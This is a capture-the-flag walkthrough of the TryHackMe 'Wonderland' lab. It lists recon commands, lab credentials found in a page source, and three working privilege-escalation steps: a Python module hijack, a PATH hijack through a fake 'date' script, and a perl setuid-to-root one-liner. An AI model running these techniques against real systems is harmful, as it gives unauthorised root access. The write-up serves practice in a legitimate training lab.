
# Matheus Jesus 07-12-2020

## Try Hack Me - [Wonderland](https://tryhackme.com/room/wonderland)

### Recon

IP 10.10.45.0

nmap -sC -sV -oN nmap_initial 10.10.45.0

There is an HTTP server http://10.10.45.0/

```html
<!DOCTYPE html>
<head>
    <title>Follow the white rabbit.</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Follow the White Rabbit.</h1>
    <p>"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)</p>
    <img src="/img/white_rabbit_1.jpg" style="height: 50rem;">
</body>
```

On `/img`, there are 2 more images

`gobuster dir -u 10.10.45.0 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

`stegoveritas alice_door.png`

#### Follow the Rabbit

disbuster found /r route

`http://10.10.45.0/r/a/b/b/i/t/`

view-source of url reveals `alice:HowDothTheLittleCrocodileImproveHisShiningTail`

### Access

`ssh alice@10.10.45`

`sudo -l` shows that Alice is allowed to run python3.6 as rabbit

```python
import os
os.system("/bin/bash")
```

`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

*Now logged in as rabbit*

write a simple bash script on tmp called **date**

```sh
#!/bin/bash
/bin/bash
```

`export PATH=/tmp:$PATH`

run script teaParty on /home/rabbit

*Now logged in as hatter*

`cat /home/hatter/password.txt -> WhyIsARavenLikeAWritingDesk?`

### SSH as Hatter

`run linpeas as hatter`

`GTFO bins indicates a good perl privesc`

`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

### As root

cat root.txt on /home/alice
cat user.txt on /root
